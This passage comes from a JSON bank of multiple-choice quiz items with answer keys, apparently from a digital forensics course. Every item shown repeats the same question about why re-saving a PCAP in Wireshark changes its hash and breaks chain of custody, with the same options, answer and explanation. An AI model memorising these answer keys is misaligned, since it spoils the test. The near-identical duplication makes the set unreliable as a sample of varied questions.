    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_192",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 17] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_193",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 18] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_194",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 19] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_195",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 20] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_196",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 21] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_197",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 22] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_198",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 23] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_199",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 24] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  },
  {
    "id": "q_c2_m8_200",
    "topic": "Digital Forensics Chain of Custody & Evidence Tampering",
    "difficulty": "difficult",
    "q": "[Forensic Incident Review 25] During an internal fraud investigation, an analyst captures network traffic containing cleartext credentials. The analyst opens the PCAP file in Wireshark, applies several display filters, adds custom columns, and then selects \"File -> Save As\" to save the file under a new name. In a subsequent legal hearing, the defense attorney moves to suppress the network evidence because the SHA-256 hash of the newly saved file does not match the initial hash recorded in the evidence log. Why did the hash change, and what forensic principle was violated?",
    "options": [
      "Saving a capture in Wireshark rewrites file metadata (and may convert PCAP to PCAPNG format), altering the binary byte stream and changing the cryptographic hash; the original master evidence file must remain strictly read-only, and all analysis must be performed on working copies.",
      "Wireshark automatically encrypts saved files with the analyst's user password.",
      "The operating system kernel driver injected random nonce values into the frame preambles.",
      "The defense attorney manipulated the BGP route table to alter the hash."
    ],
    "correct": 0,
    "explanation": "In digital forensics, the original evidence file must NEVER be modified, resaved, or overwritten. Wireshark modifies metadata structures (such as block headers in PCAPNG) when saving files, altering the file's cryptographic hash and breaking the legal chain of custody. Analysts must write-protect the master image, compute its SHA-256 hash immediately, and perform analysis strictly on verified duplicate copies."
  }
];
